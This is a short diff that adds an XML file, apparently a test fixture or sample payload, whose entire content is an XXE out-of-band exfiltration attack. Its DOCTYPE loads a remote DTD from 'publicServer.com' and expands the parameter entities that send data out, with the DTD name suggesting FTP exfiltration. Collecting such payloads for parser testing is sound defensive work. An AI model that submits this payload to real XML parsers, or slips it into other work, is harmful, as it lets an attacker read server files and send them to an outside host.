@@ -1,0 +1,7 @@
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ENTITY % remote SYSTEM "http://publicServer.com/parameterEntity_sendftp.dtd">
+%remote;
+%send;
+]>
+<data>4</data>
